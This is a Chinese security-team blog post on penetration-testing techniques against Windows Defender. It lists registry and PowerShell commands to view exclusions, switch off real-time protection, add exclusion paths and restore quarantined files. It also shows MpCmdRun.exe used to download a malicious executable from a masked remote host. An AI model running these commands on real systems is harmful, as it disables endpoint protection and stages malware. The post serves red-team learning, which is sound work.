---
title: Windows Defender的一些渗透知识
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247506479&idx=1&sn=681a87575b584327770d06688ab3c0c9&chksm=ce5df84ef92a7158cd29a233195783a17da4d51e886ec6c990c17394be0c98f3bae48d65394f&scene=58&subscene=0#rd
source: Tide安全团队
date: 2023-01-17
fetch_date: 2025-10-04T04:03:38.539906
---

# Windows Defender的一些渗透知识

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicwhyE9sy6FTX128fIfhomrTcC0Ddk094ibjthBo0ibjHZV5tcXJWzeMeQ/0?wx_fmt=jpeg)

# Windows Defender的一些渗透知识

原创

komorebi

Tide安全团队

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVEB0NZ87EFzNM4866ybBQMVhN8RQR8c6zEaACxatlch2rgdzYzYAiahr1GUq1cLMMGVnvKpF8biaWA/640?wx_fmt=png)

## 前言

Microsoft Defender，最初称为Microsoft AntiSpyware，是微软推出的一款杀毒软件。相信大家对Windows Defender 的防御性能还是没有怀疑的，毕竟最了解Windows系统的还得是微软自己。但是这货也比较令人头疼，毕竟它检测到问题直接就杀了，然后弹窗告诉用户“我已经拦截了一个XXX”。完全属于先斩后奏。今天正好看到大佬的文章，跟着学习一下Windows defender相关的知识。

## 测试环境版本

系统：Windows server 2016 Windows defender版本：版本信息：反恶意软件容户端版本：4.10.14393.1794 引擎版本：1.1.19500.2 防病毒定义：1.373.1325.0 反间谍软件定义：1.373.1325.0 网络检查系统引擎版本：2.1.14600 4 网络检查系统定义版本：119.0.00 测试权限：administrator

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicGrciaLlXeoibF4Ry36AawYkQot6qGFxh3wQKRN66ZQw0uUG4b4FycrrQ/640?wx_fmt=png "null")

## 查看Windows defender版本

### 面板查看

设置-更新和安全-Windows Defender

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicRzaT7tpoOic3COorLT2VENVJ26iaBMG7UwXjFxH703mA42GxF52lxl5Q/640?wx_fmt=png "null")

### 命令行查看

注：新版本Windows Defender已不适用

```
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicbg0RwWk2uibEicaM7iaAw3taydy8UJkbF5NPornQ9XyA76WAP87fRllcw/640?wx_fmt=png "null")

## 查看已存在的查杀排除列表

* • 通过面板查看依次选择`设置-更新和安全-Windows Defender-添加排除项`如下图

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYictTHzaeHWCN8vb9jIflEENBB5ibDj223CVczOX7eQicKic2G3qTyj3ibcBg/640?wx_fmt=png "null")

* • 通过命令行查看`reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicULBTT9xtQQmvxNiaJ6U10pQgBYiaHFkELnIb9lI0yfUop0bFdDwkRtmw/640?wx_fmt=png "null")

* • 通过Powershell查看`Get-MpPreference | select ExclusionPath`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicibBdsicUeHibePeibyVCXznCfic76GAnlLkRjfibPDWeeLVTtp86aFw3fK9Q/640?wx_fmt=png "null")

## 关闭Windows Defender的实时保护

1.通过面板关闭依次选择

```
设置-更新和安全-Windows Defender-实时保护
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicXNjNmXicok0ic3CTgvIOvyiajH6OdX6DthQEBBjRjlHJQnIEhvfEl5WFQ/640?wx_fmt=png "null")

### 通过命令行关闭defender 实时保护

* • 需要TrustedInstaller权限
* • 需要关闭Tamper Protection`reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYic5m6rAXcuXGvh0ARdtNm1BCEnbCwq5GjPqp3OR8F8Tn9B3Yglq9M40Q/640?wx_fmt=png "null")

注：通过命令行开启defender 实时保护

```
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
```

注：新版本的Windows已经不再适用

## 添加查杀排除列表

### 通过面板添加

依次选择 设置-更新和安全-Windows Defender-排除-添加排除项-选择排除的进程或文件类型&文件夹

* • 该操作等价于修改注册表HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\的键值，具体位置如下：

  类型文件对应注册表项TemporaryPaths 类型文件夹对应注册表项Paths 类型文件类型对应注册表项Extensions 类型进程对应注册表项Processes

### 通过命令行添加

利用条件:需要TrustedInstaller权限

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\tide" /d 0 /t REG_DWORD /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicY96P4VGtStTp7ZYwZvqhgibxhjc1jTIzDNORF6Zu2CrLicvmRRVCVUPw/640?wx_fmt=png "null")

## 恢复被隔离的文件

参考资料：https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide

### MpCmdRun.exe存在的位置

* • 简介 mpcmdrun.exe 是 Microsoft Windows 安全系统的重要组成部分，可帮助保护您的 PC 免受在线威胁和恶意软件的侵害。如果您想自动化 Microsoft 安全防病毒，也可以使用此实用程序。.exe 必须从 Windows 命令提示符运行。在实验过三个不同的Windows版本后，发现微软在新版本已经更改了MpCmdRun的位置（具体哪个版本后更改的不清楚，在这两个路径下查找就对了） 更改后的位置在`C:\Program Files\Windows Defender\MpCmdRun.exe`老版本`dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b`得到版本号后，则他存在的位置为`C:\ProgramData\Microsoft\Windows Defender\Platform\<版本>`比如我这台存在的物理位置为

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicibVzQOSjjDCfeoxnZIYlkV3YSOEC4FAYZrzaXMlicaKUT3BjjbjXB2OA/640?wx_fmt=png "null")

```
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2205.7-0\X86
```

### 常用命令

* • 查看被隔离的文件列表`MpCmdRun -Restore -ListAll`

  ![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYiczozRUKAA2XicT2XOAwzLpo3P4vg4wFibOEM1kSZCodhoGPhf3y7TbficA/640?wx_fmt=png "null")
* • 恢复指定名称的文件至原目录`MpCmdRun -Restore -FilePath C:\tide\7.exe`
* • 恢复所有文件至原目录`MpCmdRun -Restore -All`

  ![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYica4zss4Ozzu5Ic0dj7m1kS5yyUHSUGI1dlL3mpyBuLmZNOZ4qKzjtibg/640?wx_fmt=png "null")
* • 查看指定路径是否位于排除列表中`MpCmdRun -CheckExclusion -path C:\test`

  ## 补充1：获取TrustedInstaller权限

  ### AdvancedRun

  AdvancedRun是运行于Windows系统的轻量级程序设置优先级软件，可以轻松设置程序运行优选级，并且还能够支持通过命令行调用设置，也支持将参数保存为配置文件，以便于更好进行使用。在图形化界面

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicCfyPFR9ia6EjFJCAD0BtVgNN3ib15c2DXVibAPfzbfiaAkmEBoaCrp1lFA/640?wx_fmt=png "null")

或者使用命令行

```
AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run
```

## 补充2：MpCmdRun.exe利用

### MpCmdRun恶意文件下载

Windows Defender自带的命令执行工具"MpCmdRun.exe"可以用来实现远程下载恶意文件的目的，但是免杀好像还是不太可靠，不过我们可以在cmd中关闭Windows Defender，所以这样一来，一结合就变得有意思多了，不管在使用该思路的过程中还需要权限提升，但是CS因为在后渗透测试中有很好的辅助功能，所以总体来说还是划算的~ PS：经过实验发现在新版本中下载任何文件Windows defender都会报毒并隔离（下图），若尝试关闭实时保护则mpcmdrun不可用。。。不过老版本defender还是可以的。在目标主机上使用Windows Defender自带的MpCmdRun.exe程序下载恶意文件

```
MpCmdRun.exe -DownloadFile -url http://*.*.*.*:81/co.exe -path c:\co.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicW3zNfkia1k9ribL3C1eTFqWEUqka3L9bzI1S18GGQL9icxgnlr4wTpZgA/640?wx_fmt=png "null")

### MpCmdRun.exe解密和加载Cobalt Strike攻击载荷

这篇文章是7月底发布的，还算比较新（在我10月份写这篇文章的时候）。https://www.bleepingcomputer.com/news/security/lockbit-ransomware-abuses-windows-defender-to-load-cobalt-strike/ 一开始还以为是生成含有恶意载荷的dll文件替为MPClient.dll后就可以执行，结果在自己机器上尝试了一下根本不能上线，仔细看了看（谷歌翻译后）才明白大意是攻击者通过MpCmdRun.exe 加载修改后的MPClient.dll执行c0000015.log进而实现上线Cobalt Strike，当然这就触及到我的知识盲区了，感兴趣的铁子可以继续研究一下（教教我）。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RViapmrkdL7Q2RlYmEc7AgYicTbobNIPkXicQkBXhSYeyI2C9kkNgAANm5IUjMtv4xd3u6r9vIFUDhwQ/640?wx_fmt=png "null")

## 参考文章

https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-Defender

往期推荐

[敏感信息泄露](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247500219&idx=1&sn=8da48a9a049bab2f9215ad373868a1a5&chksm=ce5de3daf92a6acc7c2a58329c913062e9c34a9615ce742b761b2775916781abb50159a7d2d7&scene=21#wechat_redirect)

[潮影在线免杀平台上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499902&idx=1&sn=59cba8d980b4ecb0deefff99edaabd4d&chksm=ce5de21ff92a6b09a8972a0144557b0099e443aa8e018b17151c816fc7f08f3615ecb22617fc&scene=21#wechat_redirect)

[自动化渗透测试工具开发实践](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498466&idx=1&sn=085c15679436dedb06a179ca8d47951a&chksm=ce5dd883f92a5195ef74ac517741f6d3da0da40b5501d72016e52cb70344904bb85b8aef65ba&scene=21#wechat_redirect)

[【红蓝对抗】利用CS进行内网横向](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247492640&idx=1&sn=43b1991dc5628eab322923083fde8d70&chksm=ce5dc641f92a4f57ffb18e2977644b1f977fcc5e0eccdf10956d3ae4ce70dc95024500631e89&scene=21#wechat_redirect)

[一个Go版(更强大)的TideFinger](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498344&idx=1&sn=3679330363ff6890166b09f6a502f769&chksm=ce5dd809f92a511f6066fcbb12fb5c1dc8c2642e4e2690dad64d76cc6f9247eae356d16f5810&scene=21#wechat_redirect)

[SRC资产导航监测平台Tsrc上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499823&idx=1&sn=065ffeae6bd02fff922cfb12c5a0f4df&chksm=ce5de24ef92a6b58f709260b691e6b36e4a53aac00d3022946302b8e638696ed55c70e13e16f&scene=21#wechat_redirect)

[新潮信息-Tide安全团队2022年度总结](http://mp.weixi...